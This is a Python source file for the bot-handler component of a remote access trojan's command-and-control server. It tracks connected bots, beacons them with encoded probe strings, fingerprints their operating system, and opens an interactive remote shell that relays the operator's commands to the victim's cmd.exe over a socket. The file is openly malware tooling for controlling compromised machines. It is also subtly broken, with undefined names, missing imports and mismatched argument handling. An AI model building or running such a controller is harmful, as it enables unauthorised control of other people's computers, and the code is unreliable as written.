
# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time
import random

class Handler(threading.Thread):

    def __init__(self, *args):
        #tcp signature
        if len(args) == 4:
            threading.Thread.__init__(self)
            self.loggers = args[3]
            self.client = args[0]
            self.client_address = args[1]
            self.ip = client_address[0]
            self.port = client_address[1]
            self.bot_id = args[2]
            self.info = [self.bot_id,self.ip,self.port]
            self.beacon_wait = False
            self.os = ''
            self.interactive = False
            self.transport_type = "tcp"

            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                            # [0] = PING, [1] = BEACON
        #http signature
        elif len(args) == 1:
            threading.Thread.__init__(self)
            self.loggers = args[3]
            self.ip = '127.0.0.1'
            self.port = 5000
            self.address = "http://127.0.0.1:5000"
            self.bot_id = args[0]
            self.info = [self.bot_id,self.ip,self.port]
            self.beacon_wait = False
            self.os = ''
            self.interactive = False
            self.transport_type = "http"
            
            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                            # [0] = PING, [1] = BEACON
        # Log by

    # HTTP helper functions
    def api_get_request(endpoint):
        response_raw = requests.get(self.address + endpoint).text
        response_json = json.loads(response_raw)
        return response_json

    def api_post_request(endpoint, payload):
        response_raw = requests.post(self.address + endpoint, json=payload).text
        response_json = json.loads(response_raw)
        return response_json

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Bot {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+self.ip+':'+str(self.port)+' connected with Session ID of '+str(self.bot_id))
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot handler object created for: '+self.ip+':'+str(self.port)+'; Session ID of '+str(self.bot_id))

        #Not working for http currently (delete if statement once working)
        # Grab operating system : Linux/Windows
        if(self.transport_type == "tcp"):
            self.setOS()
            loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' operating system set: '+str(self.os))


        # Beacon indefinitely??
        self.beacon()


    def kill(self):     # hah
        print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")

        # Log
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing conneciton for bot '+str(self.bot_id))
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for bot '+str(self.bot_id))

        self.execute("kill")

    def beacon(self):
        # Log
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')
        loggers[0].q_log('up','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')

        while(True):
            time.sleep(random.randint(10,40))

            # Check HOST-STATUS
            try:
                # TCP
                if(self.transport_type == "tcp"):
                    ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
                    if ping == 0:
                        self.status[0] = "UP"

                    else:
                        self.status[0] = "DOWN"
                # HTTP
                elif(self.transport_type == "http"):
                    request_payload_string = f'[{{"task_type":"ping","{key}":"{value}"}}]'
                    request_payload = json.loads(request_payload_string)
                    pprint.pprint(api_post_request(api_endpoint, request_payload))

            except:
                self.status[0] = "ERR"


            # Write to log file - record uptime

            # if self.interactive:
            # Check RAT-STATUS
            if not self.beacon_wait:
                try:
                    msg = self.execute("beacon", True)

                    if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
                        self.status[1] = "UP"
                    else:
                        self.status[1] = "DOWN"
                except:
                    self.status[1] = "ERR"
                        
            # Write to beacon log file to record status



    def setStatus(self, index0, index1):
        self.status[0] = index0
        self.status[1] = index1

    def stopBeacon(self):
        self.beacon_wait = True

    def startBeacon(self):
        self.beacon_wait = False

    def setOS(self):
        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
        
    def getOS(self):
        return self.os

    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def shell(self):

        self.beacon_wait = True

        # Initiate shell

        try:
            self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")

            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")

            return False                            # unsuccessful
        else:

            banner = ""
            while True:
                try:
                    self.client.settimeout(2)
                    recv = self.client.recv(4096).decode('utf-8')
                except socket.timeout:
                    recv = ""
                
                if not recv:
                    break
                else:
                    banner += recv

            if banner:
                print(banner)
        
        time.sleep(0.5)

        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd_sent = input()                                            # Dumb capture in
                cmd_sent += "\n"
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")
                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to parse command')
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Error: ' + str(ex))

            else:
                try:
                    cmd_response = ""
                    shell_exit = False
                    if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                        print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
                        loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(bot_id))

                        self.client.send(("exit\n").encode('utf-8'))

                        while(True):

                            self.client.settimeout(0.5)

                            try:
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')

                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")

                                break

                            if not recv:
                                break
                            else:
                                cmd_response += recv  
                        
                        # print("yo1")
                        shell_exit = True

                    else:
                        self.client.send((cmd_sent).encode('utf-8'))

                        while(True):
                            try:
                                if (cmd_sent.casefold() == "\n"):
                                    self.client.settimeout(0.5)
                                elif (len(cmd_response) <= len(cmd_sent)):
                                    self.client.settimeout(5)
                                else:
                                    self.client.settimeout(1)
                                    
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")

                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")

                                break

                            if not recv:
                                break
                            
                            else:
                                cmd_response += recv
                    
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass

                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")

                else:
                    
                    if len(cmd_response.strip()) > 1:
                        # Removing sent command from response before printing output
                        print(cmd_response.replace(cmd_sent,""))
            
                    if(shell_exit):
                        break

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")

        self.beacon_wait = False
        return True


    def execute(self, cmd_sent, suppress=False):
        if not suppress:
            # Log this
            print(f"[* BotHandler-Msg] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")

        # Single instance execution
        try:
            # Send data/command to RAT
            
            self.client.send(cmd_sent.encode('utf-8'))
        except Exception as ex:
            # Log this
            print(f"[* BotHandler-Msg] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
            return "== Return Value Error =="
        else:
            cmd_response = ""
            while(True):
                try:
                    self.client.settimeout(3)
                    recv = self.client.recv(4096).decode('utf-8')

                except socket.timeout:
                    # if timeout exception is triggered - assume no more data
                    recv = ""
                except Exception as ex:
                    if not suppress:
                        # Log this
                        print("[* BotHandler-Msg:Exec] Unable to process received data.")
                        print(f"[* BotHandler-Msg:Exec] Error: {ex}")
                    break

                if not recv:
                    break
                else:
                    cmd_response += recv
            
            return str(cmd_response)
    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")